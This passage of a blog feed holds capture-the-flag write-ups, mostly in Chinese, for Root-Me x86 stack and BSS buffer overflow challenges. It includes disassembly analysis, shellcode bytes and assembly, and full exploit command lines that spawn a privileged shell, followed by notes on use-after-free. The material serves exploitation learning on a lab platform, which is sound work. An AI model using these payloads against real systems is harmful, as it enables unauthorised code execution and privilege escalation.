GetEnv</span></span><br><span class="line">[...] # How much memory is allocated?</span><br><span class="line">0x080484aa &lt;+6&gt;:        sub    $0x22c,%esp      # (1)</span><br><span class="line">[...] # Let&#x27;s see what happens after the last &#x27;strcpy&#x27; call...</span><br><span class="line">   0x080485c0 &lt;+284&gt;:        call   0x8048390 &lt;strcpy@plt&gt; </span><br><span class="line">   0x080485c5 &lt;+289&gt;:        mov    0x8(%ebp),%eax # (2-dest)</span><br><span class="line">   0x080485c8 &lt;+292&gt;:        lea    -0x21c(%ebp),%edx # (3-source)</span><br><span class="line">   0x080485ce &lt;+298&gt;:        mov    $0x200,%ebx # (4-length) </span><br><span class="line">[...] # Some alignment details skipped...</span><br><span class="line">   0x08048602 &lt;+350&gt;:        mov    %ebx,%ecx # (4-length)</span><br><span class="line">   0x08048604 &lt;+352&gt;:        shr    $0x2,%ecx # (4-length)</span><br><span class="line">   0x08048607 &lt;+355&gt;:        mov    %eax,%edi # (2-dest)</span><br><span class="line">   0x08048609 &lt;+357&gt;:        mov    %edx,%esi # (3-source)</span><br><span class="line">   0x0804860b &lt;+359&gt;:        rep movsl %ds:(%esi),%es:(%edi)</span><br></pre></td></tr></table></figure><ul><li><p> program allocates 0x22c = 556 bytes (an EnvInfo struct is around 512 bytes long),</p></li><li><p> rep movsl … instruction at the end of the function, which consists of copying <strong>n long words **from %esi to %edi, with n being the value stored in **%ecx</strong> ;</p></li><li><p>it loads an address located at %ebp + 8 into the %edi register (destination address)</p></li><li><p>it loads the address of %ebp - 540 (0x21c = 540) into the %esi register (source address)</p></li><li><p>%ecx is initially set <strong>to 0x200(512) **and then **divided by 4 (shr $2)</strong>, i.e., %ecx <strong>equals 128</strong>. Hence, 128 long (4-bytes) words will be copied, resulting in the 512 bytes of the 4 buffers of an EnvInfo struct.</p><p>in order to output its EnvInfo struct, GetEnv <strong>creates a local struct</strong> where it stores the data first, and then, in its prologue**, GetEnv actually replicates the local struct into a “remote” struct, l<strong>ocated at the address read **at %ebp + 8</strong><br>还要复制结构体</p></li></ul><p><code> $PATH=$(python -c &#39;print &quot;/usr/local/bin:&quot; + &quot;A&quot; * (164-16)&#39;) peda -ex &quot;run&quot; ./ch8</code><br>这命令</p><p>如果打印420（412+4 =416 在这里输入4个字节，总长变为420） a，溢出</p><pre><code>gdb-peda$ x/16xb 0xbffff55c0xbffff55c:     0x61    0x61    0x61    0x61    0x00    0xf5    0xff    0xbf</code></pre><p>path后面跟着一个null \00<br>会改变指针值，结构体赋值到$ebp+8指向的地址处</p><p>打印416 a</p><pre><code>0xbffff55c:     0x08048600      0xbffff570</code></pre><p>没有改变ebp+8<br>这个地址是main中env结构体地址</p><h2 id="或者重新分配512字节可写空间"><a href="#或者重新分配512字节可写空间" class="headerlink" title="或者重新分配512字节可写空间"></a>或者重新分配512字节可写空间</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> * ptr;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">        ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code> cd /tmp; gcc -m32 -o find_env find_env.c; cd -</code></p><pre><code>app-systeme-ch8@challenge02:~$ export SHELLCODE=`python -c &quot;print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;`app-systeme-ch8@challenge02:~$ export JUNK=`python -c &quot;print &#39;B&#39; * 1000&quot;`app-systeme-ch8@challenge02:~$ /tmp/find_env SHELLCODE ./ch8SHELLCODE will be at 0xbffff931app-systeme-ch8@challenge02:~$ /tmp/find_env JUNK ./ch8JUNK will be at 0xbffffb2b</code></pre><p><code>export PATH=</code>python -c “print ‘A’*160 + ‘\x31\xf9\xff\xbf’ + ‘\x2b\xfb\xff\xbf’”``</p><hr><p>我们将shellcode放在USERNAME上，我试了几个shellcode，只有这个有用，</p><pre><code>export USERNAME=`python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;`</code></pre><p>总长33字节</p><p>然后溢出PATH，要保证$ebp+8的值不变（小端序），<br>path长119，再填充一个<code>：</code>，保持为4的倍数，</p><pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/:`python -c &#39;print(&quot;\x6c\xf5\xff\xbf&quot;*11+&quot;\x50\xf7\xff\xbf&quot;)&#39;`</code></pre><p><code>0xbfff56c</code>是USERNAME地址，<code>0xbffff750</code>是$ebp+8的值，现在PATH总长168。</p><pre><code>app-systeme-ch8@challenge02:~$ ./ch8[+] Getting env...bash-4.4$ cat .passwd</code></pre><h2 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h2><h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><p><code>export USERNAME=</code></p><p>gdb中<br><code>set env USERNAME=</code></p><p>查看<br><code>x/x env.path</code></p><h3 id="查看环境变量长度"><a href="#查看环境变量长度" class="headerlink" title="查看环境变量长度"></a>查看环境变量长度</h3><p><code>echo $&#123;#PATH&#125;</code></p><hr><p><code>gdb-peda$ print $ebp-0xbffff55c</code></p><p><code>disas GetEnv</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-stack-buffer-overflow-basic-4&quot;&gt;&lt;a href=&quot;#ELF-x86-stack-buffer-overflow-basic-4&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - stack buffer overflow basic 4&quot;&gt;&lt;/a&gt;ELF x86 - stack buffer overflow basic 4&lt;/h1&gt;&lt;p&gt;参考: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&quot;&gt;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&quot;&gt;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&quot;&gt;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution&quot;&gt;https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向&quot;&gt;&lt;/a&gt;逆向&lt;/h2&gt;&lt;p&gt;&lt;code&gt;struct EnvInfo GetEnv(void)&amp;#123;&amp;#125;&lt;/code&gt; 中有&lt;code&gt;strcpy()&lt;/code&gt;函数，存在溢出点。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;            +----------------------------+
            |      HOME env variable     |     %ebp - 540
            +----------------------------+
            |    USERNAME env variable   |     %ebp - 412
            +----------------------------+
            |      SHELL env variable    |     %ebp - 284
            +----------------------------+
            |      PATH env variable     |     %ebp - 156
            +----------------------------+
            |           saved ebp        |
            +----------------------------+
            |        return address      |     %ebp + 4
            +----------------------------+
            |   rep movsl dest. address  |     %ebp + 8
            +----------------------------+  &lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - BSS buffer overflow &amp; 构造shellcode</title>
    <link href="http://finsenty54.github.io/2020/12/28/BSS_buffer_overflow/"/>
    <id>http://finsenty54.github.io/2020/12/28/BSS_buffer_overflow/</id>
    <published>2020-12-28T12:24:01.000Z</published>
    <updated>2020-12-28T13:11:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>ELF x86 - BSS buffer overflow &amp; 构造shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> username[<span class="number">512</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">void</span> (*_atexit)(<span class="keyword">int</span>) =  <span class="built_in">exit</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cp_username</span><span class="params">(<span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>((*(name++) = *(arg++)));</span><br><span class="line">  *name = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Usage : %s &lt;username&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  cp_username(username, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Running program with username : %s\n&quot;</span>, username);</span><br><span class="line">   </span><br><span class="line">  _atexit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>参考：<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow</a></p><p>The atexit and the username are global variables. Therefore, those variables positioned at the .bss section.</p><p>r2查看</p><pre><code>0x0804a040 512 obj.username0x0804a240 4 obj._atexit</code></pre><p>用username溢出exit，控制EIP</p><pre><code>./ch7 `python -c &quot;print &#39;\x6A\x46\x31\xDB\x80\xC7\x04\x80\xC3\xB7\x89\xD9\x58\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;`</code></pre><p>shellcode放在开头。</p><p><a href="http://www.kernel-panic.it/security/shellcode/shellcode5.html">http://www.kernel-panic.it/security/shellcode/shellcode5.html</a><br>生成shellcode:<br>execve(“/bin//sh”, [“/bin//sh”], NULL)</p><ol><li>a pointer to the name of the program to execute (in our case a pointer to the string <code>&quot;/bin/sh&quot;</code>);</li><li>a pointer to an array of strings to pass as <code>arguments </code>to the program (the first argument must be<code> argv[0]</code>, i.e. the name of the program itself). The <code>last element </code>of the array must be <code>a null pointer</code>;</li><li>a pointer to an array of strings to pass as environment to the program. These strings are usually in the form “key=value” and the last element must be a null pointer.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *args[<span class="number">2</span>];</span><br><span class="line">        args[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">        args[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/root_me/app_system]└──╼ $./get_shell $ ls</code></pre><p>需要解决的问题：</p><ol><li>shellcode中不能有NULL字符</li><li>需要’/bin/sh’的地址</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jmp <span class="keyword">short</span> mycall      ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop   esi         ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call  shellcode   ; Push the address of the next byte onto the <span class="built_in">stack</span>: the next</span><br><span class="line">    db    <span class="string">&quot;/bin/sh&quot;</span>   ;   byte is the beginning of the <span class="built_in">string</span> <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">get_shell.<span class="keyword">asm</span></span><br><span class="line">jmp <span class="keyword">short</span>    mycall               ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop        esi                ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    <span class="keyword">xor</span>        eax, eax           ; Zero out EAX 通过EAX获得<span class="literal">NULL</span></span><br><span class="line">    mov byte   [esi + <span class="number">7</span>], al      ; Write the null byte at the end of the <span class="built_in">string</span> 在字符串后添加终结符</span><br><span class="line">    mov dword  [esi + <span class="number">8</span>],  esi    ; [ESI+<span class="number">8</span>], i.e. the memory immediately below the <span class="built_in">string</span></span><br><span class="line">                                  ;   <span class="string">&quot;/bin/sh&quot;</span>, will contain the <span class="built_in">array</span> pointed to by the</span><br><span class="line">                                  ;   <span class="function">second argument of <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span>; therefore we store in</span><br><span class="line">                                  ;   [ESI+<span class="number">8</span>] the address of the <span class="built_in">string</span>...</span><br><span class="line">    mov dword  [esi + <span class="number">12</span>], eax    ; ...<span class="keyword">and</span> in [ESI+<span class="number">12</span>] <span class="function">the <span class="literal">NULL</span> <span class="title">pointer</span> <span class="params">(EAX is <span class="number">0</span>)</span></span></span><br><span class="line">    mov        al,  0xb           ; Store the number of the syscall (11) in EAX</span><br><span class="line">    lea        ebx, [esi]         ; Copy the address of the <span class="built_in">string</span> in EBX 参数</span><br><span class="line">    lea        ecx, [esi + <span class="number">8</span>]     ; <span class="function">Second argument to <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    lea        edx, [esi + 12]    ; Third argument to execve(2) (NULL pointer)</span><br><span class="line">    <span class="keyword">int</span>        <span class="number">0x80</span>               ; Execute the system call</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call       shellcode          ; Push the address of <span class="string">&quot;/bin/sh&quot;</span> onto the <span class="built_in">stack</span></span><br><span class="line">    db         <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><pre><code>$ nasm -f elf get_shell.asm$ ojdump -d get_shell.o</code></pre><p>汇编后得到对象文件，查看机器码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch7@challenge02:~$ .&#x2F;ch7 &#96;python -c &quot;print &#39;\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;&#96;</span><br><span class="line">[+] Running program with username : ë^1ÀˆF‰‰F</span><br><span class="line">°</span><br><span class="line">   V</span><br><span class="line"> ̀èãÿÿÿ&#x2F;bin&#x2F;shAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@ </span><br><span class="line">$ ls</span><br><span class="line">Makefile  ch7  ch7.c</span><br><span class="line">$ cat .passwd</span><br><span class="line">cat: .passwd: Permission denied</span><br></pre></td></tr></table></figure><p>shellcode权限不足</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-599.php">http://shell-storm.org/shellcode/files/shellcode-599.php</a><br>\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80<br>将0x17 改为0x46<br>When the permissions are setted to “s” instead of “S” a classic shellcode does not set EUID and UID of the current process to old UID (here app-systeme-ch7-cracked):<br>0x46 “sys_setreuid16” not the classic 0x17 “sys_setuid16” </p><hr><p>结构中函数指针<br>struct Dog {<br>    char name[12];<br>    void (<em>bark)();<br>    void (*bringBackTheFlag)();<br>    void (*death)(struct Dog</em>);<br>};</p><p><a href="https://cc-sir.github.io/2019/01/11/use_after_free/">https://cc-sir.github.io/2019/01/11/use_after_free/</a></p><p>use_after_free就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况:<br>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。<br>内存块被释放后，其对应的指针没有被设置为NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ELF x86 - BSS buffer overflow &amp;amp; 构造shellcode&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; username[&lt;span class=&quot;number&quot;&gt;512&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*_atexit)(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;) =  &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cp_username&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *arg)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((*(name++) = *(arg++)));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *name = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;[-] Usage : %s &amp;lt;username&amp;gt;\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  cp_username(username, argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;[+] Running program with username : %s\n&amp;quot;&lt;/span&gt;, username);&lt;/span&gt;&lt;br&gt;&lt;span 